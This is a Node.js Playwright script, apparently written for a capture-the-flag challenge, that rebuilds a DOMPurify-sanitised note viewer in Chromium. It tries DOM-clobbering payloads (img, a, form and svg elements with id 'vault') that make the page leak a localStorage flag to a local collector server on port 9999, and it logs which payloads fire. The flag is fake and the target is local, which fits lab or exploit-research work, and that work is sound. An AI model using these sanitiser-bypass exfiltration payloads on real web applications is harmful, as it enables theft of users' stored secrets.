// Repro the app in real Chromium to find a working scriptless exfil of localStorage flag.
const { chromium } = require('playwright');
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

// Server-side: we just need the sanitized body. But sanitize runs in browser. We'll inject raw and sanitize in-page.
const APP_HTML = (bodyRaw) => `<!doctype html><html><head></head><body>
<main id="viewer">
  <article class="note"><h1 id="v-title"></h1><div id="note"></div></article>
  <aside class="vault"><h3>Your vault</h3><div id="vault" aria-hidden="true"></div></aside>
</main>
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.4.12/dist/purify.min.js"></script>
<script>
  localStorage.setItem("flag","NNS{FAKE_LOCAL_FLAG_1234}");
  const raw = ${JSON.stringify(bodyRaw)};
  const c = DOMPurify.sanitize(raw, {FORBID_TAGS:["style"], RETURN_DOM_FRAGMENT:true});
  document.getElementById("note").replaceChildren(c);
  // po()
  const n = localStorage.getItem("flag");
  if(n){ document.getElementById("vault").textContent = n; }
</script>
</body></html>`;

const payloads = {
  'img_clobber': '<img id="vault" src="http://127.0.0.1:9999/hit?stage=start">',
  'a_clobber': '<a id="vault" href="http://127.0.0.1:9999/a">x</a>',
  'form_clobber_img': '<form id="vault"><img src="http://127.0.0.1:9999/forma"></form>',
  'svgimage': '<svg width=1 height=1><image id="vault" href="http://127.0.0.1:9999/svg"></image></svg>',
};

(async () => {
  const http = require('http');
  const hits = [];
  const srv = http.createServer((req,res)=>{ hits.push(req.url); res.end('ok'); });
  await new Promise(r=>srv.listen(9999,r));

  const browser = await chromium.launch();
  for (const [name, body] of Object.entries(payloads)) {
    const page = await browser.newPage();
    const before = hits.length;
    await page.setContent(APP_HTML(body), {waitUntil:'networkidle'}).catch(()=>{});
    await page.waitForTimeout(500);
    // read what vault text ended up / DOM
    const vaultInfo = await page.evaluate(()=>{
      const v = document.getElementById('vault');
      return {tag: v && v.tagName, text: v && v.textContent, html: document.getElementById('note').innerHTML};
    });
    const newHits = hits.slice(before);
    console.log('\n==', name, '==');
    console.log('vault tag:', vaultInfo.tag, '| text:', JSON.stringify(vaultInfo.text));
    console.log('note html:', vaultInfo.html);
    console.log('hits:', JSON.stringify(newHits));
    await page.close();
  }
  await browser.close();
  srv.close();
})();
